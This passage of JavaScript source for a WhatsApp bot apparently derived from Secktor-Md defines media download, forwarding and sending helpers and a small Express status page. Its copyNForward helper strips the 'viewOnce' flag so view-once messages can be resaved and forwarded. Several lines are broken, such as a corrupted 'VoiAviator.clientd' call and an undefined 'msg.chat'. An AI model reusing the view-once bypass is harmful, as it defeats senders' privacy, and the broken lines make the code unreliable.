                }, { quoted, ...options })
                return fs.promises.unlink(pathFile)
            }
            /**
             *
             * @param {*} message
             * @param {*} filename
             * @param {*} attachExtension
             * @returns
             */
            //========================================================================================================================================
            Aviator.client.downloadAndSaveMediaMessage = async(message, filename = 'null', attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                let trueFileName = './'+filename +'.'+type.ext
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }
	            //========================================================================================================================================
               Aviator.client.forward = async(text ,message, context , quote , attachExtension = true) => {

               let mtype = message.mtype;

               if(mtype =="conversation" ){
                  for (let jid of parsedJid(text)) {   Aviator.client.sendMessage(jid ,{text:message.text,   contextInfo : context,},{ quoted : quote } ); }
                  return; 
               }
               const getRandom = (ext) => {  return `${Math.floor(Math.random() * 10000)}${ext}`}
               let quoted = message.msg ? message.msg : message
               let mime = (message.msg || message).mimetype || ''
               let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
               const stream = await downloadContentFromMessage(quoted, messageType)
               let buffer = Buffer.from([])
               for await (const chunk of stream) {  buffer = Buffer.concat([buffer, chunk]) }
               let type = await FileType.fromBuffer(buffer)
		         let filename = await getRandom(type.ext)
               let trueFileName = './'+filename
               await fs.writeFileSync(trueFileName, buffer)
               let buttonMessage  = {}; 
               if(mtype == "videoMessage"){
                     buttonMessage  = {
                        video :fs.readFileSync(trueFileName) ,
                        mimetype: message.mimetype,
                        caption :message.text,
                        contextInfo : context,
                     }
               }else if(mtype == "imageMessage"){
                     buttonMessage  = {
                        image :fs.readFileSync(trueFileName) ,
                        mimetype: message.mimetype,
                        caption :message.text,
                        contextInfo : context,
                     }
               }else if(mtype  == "audioMessage"){
                     buttonMessage  = {
                        audio :fs.readFileSync(trueFileName) ,
                        mimetype: message.mimetype,
                        seconds : 200001355,
                        ptt : true,
                        contextInfo : context,
                     }
               }else if(mtype  == "documentWithCaptionMessage" || type  == "documentMessage" ){
                     buttonMessage  = {
                        document :fs.readFileSync(trueFileName) ,
                        mimetype: message.mimetype,
                        caption :message.text,
                        contextInfo : context,
                     }	
               }else{ try{ return fs.unlink(trueFileName);}catch(d){} }	
		
		
               for(let jid of parsedJid(text)){ 
                  try{ Aviator.client.sendMessage(jid ,buttonMessage,{ quoted : quote }); }
                  catch(e){} 
               }
               try{ fs.unlink(trueFileName);}catch(d){}
               return;
            }
            //========================================================================================================================================
            Aviator.client.downloadMediaMessage = async(message) => {
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(message, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }

            return buffer
        }

        /**
         *
         * @param {*} jid
         * @param {*} message
         * @param {*} forceForward
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await Aviator.client.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }
        Aviator.client.sendFileUrl = async(jid, url, caption = Config.caption, quoted = null , options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return Aviator.client.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, })
            }
            if (mime === "application/pdf") {
                return Aviator.client.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, })
            }
            if (mime.split("/")[0] === "image") {
                return VoiAviator.clientd.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, })
            }
            if (mime.split("/")[0] === "video") {
                return Aviator.client.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted,  })
            }
            if (mime.split("/")[0] === "audio") {
                return Aviator.client.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, })
            }
            if (mime === "application/octet-stream") {
                return Aviator.client.sendMessage(msg.chat, { image: await getBuffer(url), caption: caption, ...options    }, { quoted: quoted, })
            }
        }

        //========================================================================================================================================
        Aviator.client.cMod = (jid, copy, text = '', sender = Aviator.client.user.id, options = {}) => {
            //let copy = message.toJSON()
            let mtype = Object.keys(copy.message)[0]
            let isEphemeral = mtype === 'ephemeralMessage'
            if (isEphemeral) {
                mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
            }
            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
            let content = msg[mtype]
            if (typeof content === 'string') msg[mtype] = text || content
            else if (content.caption) content.caption = text || content.caption
            else if (content.text) content.text = text || content.text
            if (typeof content !== 'string') msg[mtype] = {
                ...content,
                ...options
            }
            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
            copy.key.remoteJid = jid
            copy.key.fromMe = sender === Aviator.client.user.id

            return proto.WebMessageInfo.fromObject(copy)
        }


        /**
         *
         * @param {*} path
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.getFile = async(PATH, save) => {
                let res
                let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
                    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
                let type = await FileType.fromBuffer(data) || {
                    mime: 'application/octet-stream',
                    ext: '.bin'
                }
                let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
                if (data && save) fs.promises.writeFile(filename, data)
                return {
                    res,
                    filename,
                    size: await getSizeMedia(data),
                    ...type,
                    data
                }

            }
            //========================================================================================================================================
            Aviator.client.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
                let types = await Aviator.client.getFile(PATH, true)
                let { filename, size, ext, mime, data } = types
                let type = '',
                    mimetype = mime,
                    pathFile = filename
                if (options.asDocument) type = 'document'
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif.js')
                    let media = { mimetype: mime, data }
                    pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
                    await fs.promises.unlink(filename)
                    type = 'sticker'
                    mimetype = 'image/webp'
                } else if (/image/.test(mime)) type = 'image'
                else if (/video/.test(mime)) type = 'video'
                else if (/audio/.test(mime)) type = 'audio'
                else type = 'document'
                await Aviator.client.sendMessage(jid, {
                    [type]: { url: pathFile },
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options })
                return fs.promises.unlink(pathFile)
            }
            //========================================================================================================================================
            Aviator.client.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        return Aviator.client
    }

    syncdb().catch(err => console.log(err))
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Secktor-Md</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Hello from Aviator.client-Md!
    </section>
  </body>
</html>
`
app.get("/", (req, res) => res.type('html').send(html));
app.listen(port, () => console.log(`Aviator.client Server listening on port http://localhost:${port}!`));
    //=============================[to get message of New Update of this file.]===================================================
    let file = require.resolve(__filename)
    fs.watchFile(file, () => {
        fs.unwatchFile(file)
        console.log(`Update ${__filename}`)
        delete require.cache[file]
        require(file)
    })
}, 3000)

function atob(str) { return Buffer.from(str, 'base64').toString('binary');}
